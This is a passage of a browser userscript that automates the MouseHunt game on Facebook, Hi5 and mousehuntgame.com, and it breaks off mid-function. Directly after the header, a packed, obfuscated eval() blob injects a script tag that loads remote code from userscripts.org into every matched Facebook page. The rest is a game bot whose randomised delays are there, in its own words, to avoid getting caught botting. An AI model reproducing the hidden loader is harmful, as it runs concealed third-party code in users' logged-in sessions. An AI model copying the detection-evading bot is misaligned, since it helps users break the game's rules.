// ==UserScript==
// @name        MouseHunt AutoBot Plus + Last Update
// @author      Ooi Keng Siang
// @version    	1.28
// @namespace   http://ooiks.com/blog/mousehunt-autobot
// @description An advance user script to automate sounding the hunter horn in MouseHunt application in Facebook with MouseHunt version 3.0 (Longtail) supported and many other features.
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include		http://mousehuntgame.com/*
// @include		https://mousehuntgame.com/*
// @include		http://www.mousehuntgame.com/*
// @include		https://www.mousehuntgame.com/*
// @include		http://apps.facebook.com/mousehunt/*
// @include		https://apps.facebook.com/mousehunt/*
// @include		http://hi5.com/friend/games/MouseHunt*
// @include		http://mousehunt.hi5.hitgrab.com/*
// ==/UserScript==

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


// == Basic User Preference Setting (Begin) ==
// // The variable in this section contain basic option will normally edit by most user to suit their own preference
// // Reload MouseHunt page manually if edit this script while running it for immediate effect.

// // Extra delay time before sounding the horn. (in seconds)
// // Default: 5 - 180
var hornTimeDelayMin = 5;
var hornTimeDelayMax = 180;

// // Bot aggressively by ignore all safety measure such as check horn image visible before sounding it. (true/false)
// // Note: Highly recommanded to turn off because it increase the chances of getting caugh in botting.
// // Note: It will ignore the hornTimeDelayMin and hornTimeDelayMax.
// // Note: It may take a little bit extra of CPU processing power.
var aggressiveMode = false;

// // Enable trap check once an hour. (true/false)
var enableTrapCheck = false;

// // Trap check time different value (00 minutes - 45 minutes)
// // Note: Every player had different trap check time, set your trap check time here. It only take effect if enableTrapCheck = true;
// // Example: If you have XX:00 trap check time then set 00. If you have XX:45 trap check time, then set 45.
var trapCheckTimeDiff = 45;

// // Extra delay time to trap check. (in seconds)
// // Note: It only take effect if enableTrapCheck = true;
var checkTimeDelayMin = 15;
var checkTimeDelayMax = 120;

// // Play sound when encounter king's reward (true/false)
var isKingWarningSound = true;

// // Reload the the page according to kingPauseTimeMax when encount King Reward. (true/false)
// // Note: No matter how many time you refresh, the King's Reward won't go away unless you resolve it manually.
var reloadKingReward = false;

// // Duration of pausing the script before reload the King's Reward page (in seconds)
// // Note: It only take effect if reloadKingReward = true;
var kingPauseTimeMax = 18000;

// // The script will pause if player at different location that hunt location set before. (true/false)
// // Note: Make sure you set showTimerInPage to true in order to know what is happening.
var pauseAtInvalidLocation = false;

// == Basic User Preference Setting (End) ==





// == Advance User Preference Setting (Begin) ==
// // The variable in this section contain some advance option that will change the script behavior.
// // Edit this variable only if you know what you are doing 
// // Reload MouseHunt page manually if edit this script while running it for immediate effect.

// // Display timer and message in page title. (true/false)
var showTimerInTitle = true;

// // Embed a timer in page to show next hunter horn timer, highly recommanded to turn on. (true/false)
// // Note: You may not access some option like pause at invalid location if you turn this off.
var showTimerInPage = true;

// // Display the last time the page did a refresh or reload. (true/false)
var showLastPageLoadTime = true;

// // Default time to reload the page when bot encounter error. (in seconds)
var errorReloadTime = 60;

// // Time interval for script timer to update the time. May affact timer accuracy if set too high value. (in seconds)
var timerRefreshInterval = 1;

// == Advance User Preference Setting (End) ==





// WARNING - Do not modify the code below unless you know how to read and write the script.

// All global variable declaration and default value
var scriptVersion = "1.28";
var fbPlatform = false;
var hiFivePlatform = false;
var mhPlatform = false;
var mhMobilePlatform = false;
var secureConnection = false;
var lastDateRecorded = new Date();
var hornTime = 900;
var hornTimeDelay = 0;
var checkTimeDelay = 0;
var isKingReward = false;
var lastKingRewardSumTime;
var kingPauseTime;
var baitQuantity = -1;
var huntLocation;
var currentLocation;
var today = new Date();
var checkTime = (today.getMinutes() >= trapCheckTimeDiff) ? 3600 + (trapCheckTimeDiff * 60) - (today.getMinutes() * 60 + today.getSeconds()) : (trapCheckTimeDiff * 60) - (today.getMinutes() * 60 + today.getSeconds());
today = undefined;
var hornRetryMax = 10;
var hornRetry = 0;
var nextActiveTime = 900;
var timerInterval = 2;

// element in page
var titleElement;
var nextHornTimeElement;
var checkTimeElement;
var kingTimeElement;
var lastKingRewardSumTimeElement;
var optionElement;
var travelElement;

// start executing script
exeScript();

function exeScript()
{
	// check the trap check setting first
	if (trapCheckTimeDiff == 60)
	{
		trapCheckTimeDiff = 00;
	}
	else if (trapCheckTimeDiff < 0 || trapCheckTimeDiff > 60)
	{
		// invalid value, just disable the trap check
		enableTrapCheck = false;
	}
	
	if (showTimerInTitle)
	{
		// check if they are running in iFrame
		if (window.location.href.indexOf("apps.facebook.com/mousehunt/") != -1)
		{
			var contentElement = document.getElementById('pagelet_canvas_content');
			if (contentElement)
			{
				var breakFrameDivElement = document.createElement('div');
				breakFrameDivElement.setAttribute('id', 'breakFrameDivElement');
				breakFrameDivElement.innerHTML = "Timer cannot show on title page. You can <a href='http://www.mousehuntgame.com/canvas/'>run MouseHunt without iFrame (Facebook)</a> to enable timer on title page";
				contentElement.parentNode.insertBefore(breakFrameDivElement, contentElement);
			}
			contentElement = undefined;
		}
		else if (window.location.href.indexOf("hi5.com/friend/games/MouseHunt") != -1)
		{
			var contentElement = document.getElementById('apps-canvas-body');
			if (contentElement)
			{
				var breakFrameDivElement = document.createElement('div');
				breakFrameDivElement.setAttribute('id', 'breakFrameDivElement');
				breakFrameDivElement.innerHTML = "Timer cannot show on title page. You can <a href='http://mousehunt.hi5.hitgrab.com/'>run MouseHunt without iFrame (Hi5)</a> to enable timer on title page";
				contentElement.parentNode.insertBefore(breakFrameDivElement, contentElement);
			}
			contentElement = undefined;
		}
	}
	
	// check user running this script from where
	if (window.location.href.indexOf("mousehuntgame.com/canvas/") != -1)
	{
		// from facebook
		fbPlatform = true;
	}
	else if (window.location.href.indexOf("mousehuntgame.com") != -1)
	{
		// need to check if it is running in mobile version
		var version = getCookie("switch_to");
		if (version != null && version == "mobile")
		{
			// from mousehunt game mobile version
			mhMobilePlatform = true;
		}
		else
		{
		// from mousehunt game standard version
			mhPlatform = true
		}
		version = undefined;
	}
	else if (window.location.href.indexOf("mousehunt.hi5.hitgrab.com") != -1)
	{
		// from hi5
		hiFivePlatform = true;
	}
	
	// check if user running in https secure connection
	if (window.location.href.indexOf("https://") != -1)
	{
		secureConnection = true;
	}
	else
	{
		secureConnection = false;
	}
	
	if (fbPlatform)
	{
		if (window.location.href == "http://www.mousehuntgame.com/canvas/" ||
			window.location.href == "http://www.mousehuntgame.com/canvas/#" ||
			window.location.href == "https://www.mousehuntgame.com/canvas/" ||
			window.location.href == "https://www.mousehuntgame.com/canvas/#" ||
			window.location.href.indexOf("mousehuntgame.com/canvas/index.php") != -1 ||
			window.location.href.indexOf("mousehuntgame.com/canvas/turn.php") != -1 ||
			window.location.href.indexOf("mousehuntgame.com/canvas/?") != -1)
		{
			// page to execute the script!
			
			// make sure all the preference already loaded
			loadPreferenceSettingFromStorage();
			
			// this is the page to execute the script
			if (!checkIntroContainer() && retrieveDataFirst())
			{
				// embed a place where timer show
				embedTimer(true);
				
				// embed script to horn button
				embedScript();
				
				// start script action
				action();
			}
			else
			{
				// fail to retrieve data, display error msg and reload the page
				document.title = "Fail to retrieve data from page. Reloading in " + timeformat(errorReloadTime);
				window.setTimeout(function () { reloadPage(false) }, errorReloadTime * 1000);
			}
		}
		else
		{
			// not in huntcamp, just show the title of autobot version
			embedTimer(false);
		}
	}
	else if (mhPlatform)
	{
		if (window.location.href == "http://www.mousehuntgame.com/" ||
			window.location.href == "http://www.mousehuntgame.com/#" ||
			window.location.href == "http://www.mousehuntgame.com/?switch_to=standard" ||
			window.location.href == "https://www.mousehuntgame.com/" ||
			window.location.href == "https://www.mousehuntgame.com/#" ||
			window.location.href == "https://www.mousehuntgame.com/?switch_to=standard" ||
			window.location.href.indexOf("mousehuntgame.com/turn.php") != -1 ||
			window.location.href.indexOf("mousehuntgame.com/index.php") != -1)
		{
			// page to execute the script!
		
			// make sure all the preference already loaded
			loadPreferenceSettingFromStorage();
		
			// this is the page to execute the script
			if (!checkIntroContainer() && retrieveDataFirst())
			{
				// embed a place where timer show
				embedTimer(true);
				
				// embed script to horn button
				embedScript();
					
				// start script action
				action();
			}
			else
			{
				// fail to retrieve data, display error msg and reload the page
				document.title = "Fail to retrieve data from page. Reloading in " + timeformat(errorReloadTime);
				window.setTimeout(function () { reloadPage(false) }, errorReloadTime * 1000);
			}
		}
		else
		{
			// not in huntcamp, just show the title of autobot version
			embedTimer(false);
		}
	}
	else if (mhMobilePlatform)
	{
		// execute at all page of mobile version
		if (true)
		{
			// page to execute the script!
		
			// make sure all the preference already loaded
			loadPreferenceSettingFromStorage();
			
			// embed a place where timer show
			embedTimer(false);
		}
	}
	else if (hiFivePlatform)
	{
		if (window.location.href == "http://mousehunt.hi5.hitgrab.com/#" ||
			window.location.href.indexOf("http://mousehunt.hi5.hitgrab.com/?") != -1 ||
			window.location.href == "http://mousehunt.hi5.hitgrab.com/" ||
			window.location.href.indexOf("http://mousehunt.hi5.hitgrab.com/turn.php") != -1 ||
			window.location.href.indexOf("http://mousehunt.hi5.hitgrab.com/index.php") != -1)
		{
			// page to execute the script!
		
			// make sure all the preference already loaded
			loadPreferenceSettingFromStorage();
		
			// this is the page to execute the script
			if (!checkIntroContainer() && retrieveDataFirst())
			{
				// embed a place where timer show
				embedTimer(true);
				
				// embed script to horn button
				embedScript();
					
				// start script action
				action();
			}
			else
			{
				// fail to retrieve data, display error msg and reload the page
				document.title = "Fail to retrieve data from page. Reloading in " + timeformat(errorReloadTime);
				window.setTimeout(function () { reloadPage(false) }, errorReloadTime * 1000);
			}
		}
		else
		{
			// not in huntcamp, just show the title of autobot version
			embedTimer(false);
		}
	}
}

function checkIntroContainer()
{
	var gotIntroContainerDiv = false;

	var introContainerDiv = document.getElementById('introContainer');
	if (introContainerDiv)
	{
		introContainerDiv = undefined;
		gotIntroContainerDiv = true;
	}
	else
	{
		gotIntroContainerDiv = false;
	}
	
	try
	{
		return (gotIntroContainerDiv);
	}
	finally
	{
		gotIntroContainerDiv = undefined;
	}
}

function retrieveDataFirst()
{
	var gotHornTime = false;
	var gotPuzzle = false;
	var gotBaitQuantity = false;
	var retrieveSuccess = false;
	
	var scriptElementList = document.getElementsByTagName('script');
	if (scriptElementList)
	{
		var i;
		for (i = 0; i < scriptElementList.length; ++i)
		{
			var scriptString = scriptElementList[i].innerHTML;
			
			// get next horn time
			var hornTimeStartIndex = scriptString.indexOf("next_activeturn_seconds");
			if (hornTimeStartIndex >= 0)
			{
				var nextActiveTime = 900;
				hornTimeStartIndex += 25;
				var hornTimeEndIndex = scriptString.indexOf(",", hornTimeStartIndex);
				var hornTimerString = scriptString.substring(hornTimeStartIndex, hornTimeEndIndex);
				nextActiveTime = parseInt(hornTimerString);
				
				hornTimeDelay = hornTimeDelayMin + Math.round(Math.random() * (hornTimeDelayMax - hornTimeDelayMin));
				
				if (!aggressiveMode)
				{
					// calculation base on the js in Mousehunt
					var additionalDelayTime = Math.ceil(nextActiveTime * 0.1);
				
					// need to found out the mousehunt provided timer interval to determine the additional delay
					var timerIntervalStartIndex = scriptString.indexOf("hud.timer_interval");
					if (timerIntervalStartIndex >= 0)
					{
						timerIntervalStartIndex += 21;
						var timerIntervalEndIndex = scriptString.indexOf(";", timerIntervalStartIndex);
						var timerIntervalString = scriptString.substring(timerIntervalStartIndex, timerIntervalEndIndex);
						var timerInterval = parseInt(timerIntervalString);
						
						// calculation base on the js in Mousehunt
						if (timerInterval == 1)
						{
							additionalDelayTime = 2;
						}
						
						timerIntervalStartIndex = undefined;
						timerIntervalEndIndex = undefined;
						timerIntervalString = undefined;
						timerInterval = undefined;
					}
					
					// safety mode, include extra delay like time in horn image appear
					//hornTime = nextActiveTime + additionalDelayTime + hornTimeDelay;
					hornTime = nextActiveTime + hornTimeDelay;
					lastDateRecorded = undefined;
					lastDateRecorded = new Date();
					
					additionalDelayTime = undefined;
				}
				else
				{
					// aggressive mode, no extra delay like time in horn image appear
					hornTime = nextActiveTime;
					lastDateRecorded = undefined;
					lastDateRecorded = new Date();
				}
				
				gotHornTime = true;
				
				hornTimeStartIndex = undefined;
				hornTimeEndIndex = undefined;
				hornTimerString = undefined;
				nextActiveTime = undefined;
			}
			
			// get is king's reward or not
			var hasPuzzleStartIndex = scriptString.indexOf("has_puzzle");
			if (hasPuzzleStartIndex >= 0)
			{
				hasPuzzleStartIndex += 12;
				var hasPuzzleEndIndex = scriptString.indexOf(",", hasPuzzleStartIndex);
				var hasPuzzleString = scriptString.substring(hasPuzzleStartIndex, hasPuzzleEndIndex);
				isKingReward = (hasPuzzleString == 'false') ? false : true;
				
				gotPuzzle = true;
				
				hasPuzzleStartIndex = undefined;
				hasPuzzleEndIndex = undefined;
				hasPuzzleString = undefined;
			}
			
			// get cheese quantity
			var baitQuantityStartIndex = scriptString.indexOf("bait_quantity");
			if (baitQuantityStartIndex >= 0)
			{
				baitQuantityStartIndex += 15;
				var baitQuantityEndIndex = scriptString.indexOf(",", baitQuantityStartIndex);
				var baitQuantityString = scriptString.substring(baitQuantityStartIndex, baitQuantityEndIndex);
				baitQuantity = parseInt(baitQuantityString);
				
				gotBaitQuantity = true;
				
				baitQuantityStartIndex = undefined;
				baitQuantityEndIndex = undefined;
				baitQuantityString = undefined;
			}
			
			var locationStartIndex;
			var locationEndIndex;
			locationStartIndex = scriptString.indexOf("location\":\"");
			if (locationStartIndex >= 0)
			{
				locationStartIndex += 11;
				locationEndIndex = scriptString.indexOf("\"", locationStartIndex);
				var locationString = scriptString.substring(locationStartIndex, locationEndIndex);
				currentLocation = locationString;
				
				locationStartIndex = undefined;
				locationEndIndex = undefined;
				locationString = undefined;
			}
			
			scriptString = undefined;
		}
		i = undefined;
	}
	scriptElementList = undefined;
	
	if (gotHornTime && gotPuzzle && gotBaitQuantity)
	{
		// get trap check time
		if (enableTrapCheck)
		{
			var today = new Date();
			checkTimeDelay = checkTimeDelayMin + Math.round(Math.random() * (checkTimeDelayMax - checkTimeDelayMin));
			checkTime = (today.getMinutes() >= trapCheckTimeDiff) ? 3600 + (trapCheckTimeDiff * 60) - (today.getMinutes() * 60 + today.getSeconds()) : (trapCheckTimeDiff * 60) - (today.getMinutes() * 60 + today.getSeconds());
			checkTime += checkTimeDelay;
			today = undefined;
		}
		
		// get last location
		var huntLocationCookie = getStorage("huntLocation");
		if (huntLocationCookie == undefined || huntLocationCookie == null)
		{
			huntLocation = currentLocation;
			setStorage("huntLocation", currentLocation);
		}
		else
		{
			huntLocation = huntLocationCookie;
			setStorage("huntLocation", huntLocation);
		}
		huntLocationCookie = undefined;
		
		// get last king reward time
		var lastKingRewardDate = getStorage("lastKingRewardDate");
		if (lastKingRewardDate == undefined || lastKingRewardDate == null)
		{
			lastKingRewardSumTime = -1;
		}
		else
		{
			var lastDate = new Date(lastKingRewardDate);
			lastKingRewardSumTime = parseInt((new Date() - lastDate) / 1000);
			lastDate = undefined;
		}
		lastKingRewardDate = undefined;
		
		retrieveSuccess = true;
	}
	else
	{
		retrieveSuccess = false;
	}
	
	// clean up
	gotHornTime = undefined;
	gotPuzzle = undefined;
	gotBaitQuantity = undefined;
	
	try
	{
		return (retrieveSuccess);
	}
	finally
	{
		retrieveSuccess = undefined;
	}
}

function retrieveData()
{
	var browser = browserDetection();
	
	// get next horn time
	if (browser == "firefox")
	{
		nextActiveTime = unsafeWindow.user.next_activeturn_seconds;
		isKingReward = unsafeWindow.user.has_puzzle;
		baitQuantity = unsafeWindow.user.bait_quantity;
		currentLocation = unsafeWindow.user.location;
	}
	else if (browser == "opera")
	{
		nextActiveTime = user.next_activeturn_seconds;
		isKingReward = user.has_puzzle;
		baitQuantity = user.bait_quantity;
		currentLocation = user.location;
	}
	else if (browser == "chrome")
	{
		nextActiveTime = parseInt(getPageVariableForChrome("user.next_activeturn_seconds"));
		isKingReward = (getPageVariableForChrome("user.has_puzzle").toString() == "false") ? false : true;
		baitQuantity = parseInt(getPageVariableForChrome("user.bait_quantity"));
		currentLocation = getPageVariableForChrome("user.location");
	}
	else
	{
		window.setTimeout(function () { reloadWithMessage("Browser not supported. Reloading...", false); }, 60000);
	}
	
	browser = undefined;
	
	if (nextActiveTime == "" || isNaN(nextActiveTime))
	{
		// fail to retrieve data, might be due to slow network
		
		// reload the page to see it fix the problem
		window.setTimeout(function () { reloadWithMessage("Fail to retrieve data. Reloading...", false); }, 5000);
	}
	else
	{
		// got the timer right!
	
		// calculate the delay
		hornTimeDelay = hornTimeDelayMin + Math.round(Math.random() * (hornTimeDelayMax - hornTimeDelayMin));
	
		if (!aggressiveMode)
		{
			// calculation base on the js in Mousehunt
			var additionalDelayTime = Math.ceil(nextActiveTime * 0.1);
			if (timerInterval != "" && !isNaN(timerInterval) && timerInterval == 1)
			{
				additionalDelayTime = 2;
			}
			
			// safety mode, include extra delay like time in horn image appear
			//hornTime = nextActiveTime + additionalDelayTime + hornTimeDelay;
			hornTime = nextActiveTime + hornTimeDelay;
			lastDateRecorded = undefined;
			lastDateRecorded = new Date();
			
			additionalDelayTime = undefined;
		}
		else
		{
			// aggressive mode, no extra delay like time in horn image appear
			hornTime = nextActiveTime;
			lastDateRecorded = undefined;
			lastDateRecorded = new Date();
		}
	}
	
	// get trap check time
	if (enableTrapCheck)
	{
		var today = new Date();
		checkTimeDelay = checkTimeDelayMin + Math.round(Math.random() * (checkTimeDelayMax - checkTimeDelayMin));
		checkTime = (today.getMinutes() >= trapCheckTimeDiff) ? 3600 + (trapCheckTimeDiff * 60) - (today.getMinutes() * 60 + today.getSeconds()) : (trapCheckTimeDiff * 60) - (today.getMinutes() * 60 + today.getSeconds());
		checkTime += checkTimeDelay;
		today = undefined;
	}
}

function getPageVariable(name, value)
{
	if (name == "user.next_activeturn_seconds")
	{
		nextActiveTime = parseInt(value);
	}
	else if (name == "hud.timer_interval")
	{
		timerInterval = parseInt(value);
	}
	else if (name == "user.has_puzzle")
	{
		isKingReward = (value.toString() == true) ? true : false;
	}
	else if (name == "user.bait_quantity")
	{
		baitQuantity = parseInt(value);
	}
	else if (name == "user.location")
	{
		currentLocation = value.toString();
	}
	
	name = undefined;
	value = undefined;
}

function checkJournalDate()
{
	var reload = false;

	var journalDateDiv = document.getElementsByClassName('journaldate');
	if (journalDateDiv)
	{
		var journalDateStr = journalDateDiv[0].innerHTML.toString();
		var midIndex = journalDateStr.indexOf(":", 0);
		var spaceIndex = journalDateStr.indexOf(" ", midIndex);
		
		if (midIndex >= 1)
		{
			var hrStr = journalDateStr.substring(0, midIndex);
			var minStr = journalDateStr.substring(midIndex + 1, 2);
			var hourSysStr = journalDateStr.substring(spaceIndex + 1, 2);
			
			var nowDate = new Date();
			var lastHuntDate = new Date();
			if (hourSysStr == "am")
			{
				lastHuntDate.setHours(parseInt(hrStr), parseInt(minStr), 0, 0);
			}
			else
			{
				lastHuntDate.setHours(parseInt(hrStr) + 12, parseInt(minStr), 0, 0);
			}
			if (parseInt(nowDate - lastHuntDate) / 1000 > 900)
			{
				reload = true;
			}
			hrStr = undefined;
			minStr = undefined;
			nowDate = undefined;
			lastHuntDate = undefined;
		}
		else
		{
			reload = true;
		}
		
		journalDateStr = undefined;
		midIndex = undefined;
		spaceIndex = undefined;
	}
	journalDateDiv = undefined;
	
	if (reload)
	{
		reloadWithMessage("Timer error. Try reload to fix.", true);
	}
	
	try
	{
		return (reload);
	}
	finally
	{
		reload = undefined;
	}
}

function action()
{
	if (isKingReward)
	{
		kingRewardAction();
	}
	else if (pauseAtInvalidLocation && (huntLocation != currentLocation))
	{
		// update timer
		displayTimer("Out of pre-defined hunting location...", "Out of pre-defined hunting location...", "Out of pre-defined hunting location...");
		
		if (fbPlatform)
		{
			if (secureConnection)
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='https://www.mousehuntgame.com/canvas/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
			else
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='http://www.mousehuntgame.com/canvas/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
		}
		else if (hiFivePlatform)
		{
			if (secureConnection)
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='https://mousehunt.hi5.hitgrab.com/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
			else
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='http://mousehunt.hi5.hitgrab.com/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
		}
		else if (mhPlatform)
		{
			if (secureConnection)
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='https://www.mousehuntgame.com/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
			else
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='http://www.mousehuntgame.com/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
		}
		
		displayKingRewardSumTime(null);
		
		// pause script
	}
	else if (baitQuantity == 0)
	{
		// update timer
		displayTimer("No more cheese!", "Cannot hunt without the cheese...", "Cannot hunt without the cheese...");
		displayLocation(huntLocation);
		displayKingRewardSumTime(null);
		
		// pause the script
	}
	else
	{
		// update location
		displayLocation(huntLocation);
	
		var isHornSounding = false;
	
		// check if the horn image is visible
		var headerElement;
		headerElement = document.getElementById('header');
		if (headerElement)
		{
			var headerStatus = headerElement.getAttribute('class');
			if (headerStatus.indexOf("hornready") != -1)
			{
				// if the horn image is visible, why do we need to wait any more, sound the horn!
				soundHorn();
				
				// make sure the timer don't run twice!
				isHornSounding = true;
			}
			headerStatus = undefined;
		}
		headerElement = undefined;
	
		if (isHornSounding == false)
		{
			// start timer
			window.setTimeout(function () { countdownTimer() }, timerRefreshInterval * 1000);
		}
		
		isHornSounding = undefined;
	}
}

function countdownTimer()
{
	if (isKingReward)
	{
		// update timer
		displayTimer("King's Reward!", "King's Reward!", "King's Reward");
		displayKingRewardSumTime("Now");
		
		// record last king's reward time
		var nowDate = new Date();
		setStorage("lastKingRewardDate", nowDate.toString());
		nowDate = undefined;
		lastKingRewardSumTime = 0;
		
		// reload the page so that the sound can be play
		// simulate mouse click on the camp button
		fireEvent(document.getElementsByClassName('campbutton')[0].firstChild, 'click');
		
		// reload the page if click on camp button fail
		window.setTimeout(function () { reloadWithMessage("Fail to click on camp button. Reloading...", false); }, 5000);
	}
	else if (pauseAtInvalidLocation && (huntLocation != currentLocation))
	{
		// update timer
		displayTimer("Out of pre-defined hunting location...", "Out of pre-defined hunting location...", "Out of pre-defined hunting location...");
		if (fbPlatform)
		{
			if (secureConnection)
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='https://www.mousehuntgame.com/canvas/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
			else
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='http://www.mousehuntgame.com/canvas/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
		}
		else if (hiFivePlatform)
		{
			if (secureConnection)
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='https://mousehunt.hi5.hitgrab.com/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
			else
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='http://mousehunt.hi5.hitgrab.com/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
		}
		else if (mhPlatform)
		{
			if (secureConnection)
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='https://www.mousehuntgame.com/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
			else
			{
				displayLocation("<font color='red'>" + currentLocation + "</font> [<a onclick='window.localStorage.removeItem(\"huntLocation\");' href='http://www.mousehuntgame.com/\'>Hunt Here</a>] - <i>Script pause because you had move to a different location recently, click hunt here to continue hunt at this location.</i>");
			}
		}
		displayKingRewardSumTime(null);
		
		// pause script
	}
	else if (baitQuantity == 0)
	{
		// update timer
		displayTimer("No more cheese!", "Cannot hunt without the cheese...", "Cannot hunt without the cheese...");
		displayLocation(huntLocation);
		displayKingRewardSumTime(null);
		
		// pause the script
	}
	else
	{
		var dateNow = new Date();
		var intervalTime = timeElapsed(lastDateRecorded, dateNow);
		lastDateRecorded = undefined;
		lastDateRecorded = dateNow;
		dateNow = undefined;
	
		if (enableTrapCheck)
		{
			// update time
			hornTime -= intervalTime;
			checkTime -= intervalTime;
			if (lastKingRewardSumTime != -1)
			{
				lastKingRewardSumTime += intervalTime;
			}
		}
		else
		{
			// update time
			hornTime -= intervalTime;
			if (lastKingRewardSumTime != -1)
			{
				lastKingRewardSumTime += intervalTime;
			}
		}
		
		intervalTime = undefined;
	
		if (hornTime <= 0)
		{
			// blow the horn!
			soundHorn();
		}
		else if (enableTrapCheck && checkTime <= 0)
		{
			// trap check!
			trapCheck();
		}
		else
		{
			if (enableTrapCheck)
			{
				// update timer
				if (!aggressiveMode)
				{
					displayTimer("Horn: " + timeformat(hornTime) + " | Check: " + timeformat(checkTime), 
						timeformat(hornTime) + "  <i>(included extra " + timeformat(hornTimeDelay) + " delay & +/- 5 seconds different from MouseHunt timer)</i>", 
						timeformat(checkTime) + "  <i>(included extra " + timeformat(checkTimeDelay) + " delay)</i>");
				}
				else
				{
					displayTimer("Horn: " + timeformat(hornTime) + " | Check: " + timeformat(checkTime), 
						timeformat(hornTime) + "  <i>(lot faster than MouseHunt timer)</i>", 
						timeformat(checkTime) + "  <i>(included extra " + timeformat(checkTimeDelay) + " delay)</i>");
				}
			}
			else
			{
				// update timer
				if (!aggressiveMode)
				{
					displayTimer("Horn: " + timeformat(hornTime), 
						timeformat(hornTime) + "  <i>(included extra " + timeformat(hornTimeDelay) + " delay & +/- 5 seconds different from MouseHunt timer)</i>", 
						"-");
					
					// check if user manaually sounded the horn
					var scriptNode = document.getElementById("scriptNode");
					if (scriptNode)
					{
						var isHornSounded = scriptNode.getAttribute("soundedHornAtt");
						if (isHornSounded == "true")
						{
							// sound horn function do the rest
							soundHorn();
							
							// stop loopping
							return;
						}
						isHornSounded = undefined;
					}		
					scriptNode = undefined;
				}
				else
				{
					displayTimer("Horn: " + timeformat(hornTime), 
						timeformat(hornTime) + "  <i>(lot faster than MouseHunt timer)</i>", 
						"-");
					
					// agressive mode should sound the horn whenever it is possible to do so.
					var headerElement = document.getElementById('header');
					if (headerElement)
					{
						// the horn image appear before the timer end
						if (headerElement.getAttribute('class').indexOf("hornready") != -1)
						{
							// who care, blow the horn first!
							soundHorn();
							
							headerElement = undefined;
							
							// skip all the code below
							return;
						}
					}
					headerElement = undefined;
				}
			}
			
			// set king reward sum time
			displayKingRewardSumTime(timeFormatLong(lastKingRewardSumTime));
			
			window.setTimeout(function () { (countdownTimer)() }, timerRefreshInterval * 1000);
		}
	}
}







function reloadPage(soundHorn)
{
	// reload the page
	if (fbPlatform)
	{
		// for Facebook only

		if (secureConnection)
		{
			if (soundHorn)
			{
				window.location.href = "https://www.mousehuntgame.com/canvas/turn.php";
			}
			else
			{
				window.location.href = "https://www.mousehuntgame.com/canvas/";
			}
		}
		else
		{
			if (soundHorn)
			{
				window.location.href = "http://www.mousehuntgame.com/canvas/turn.php";
			}
			else
			{
				window.location.href = "http://www.mousehuntgame.com/canvas/";
			}
		}
	}
	else if (hiFivePlatform)
	{
		// for Hi5 only
	
		if (secureConnection)
		{
			if (soundHorn)
			{
				window.location.href = "https://mousehunt.hi5.hitgrab.com/turn.php";
			}
			else
			{
				window.location.href = "https://mousehunt.hi5.hitgrab.com/";
			}
		}
		else
		{
			if (soundHorn)
			{
				window.location.href = "http://mousehunt.hi5.hitgrab.com/turn.php";
			}
			else
			{
				window.location.href = "http://mousehunt.hi5.hitgrab.com/";
			}
		}
	}
	else if (mhPlatform)
	{
		// for mousehunt game only
		
		if (secureConnection)
		{
			if (soundHorn)
			{
				window.location.href = "https://mousehuntgame.com/turn.php";
			}
			else
			{
				window.location.href = "https://mousehuntgame.com/";
			}
		}
		else
		{
			if (soundHorn)
			{
				window.location.href = "http://mousehuntgame.com/turn.php";
			}
			else
			{
				window.location.href = "http://mousehuntgame.com/";
			}
		}
	}
	
	soundHorn = undefined;
}

function reloadWithMessage(msg, soundHorn)
{
	// display the message
	displayTimer(msg, msg, msg, msg);
	
	// reload the page
	reloadPage(soundHorn);
	
	msg = undefined;
	soundHorn = undefined;
}

// ################################################################################################
//   Timer Function - Start
// ################################################################################################

function embedTimer(targetPage)
{
	if (showTimerInPage)
	{
		var headerElement;
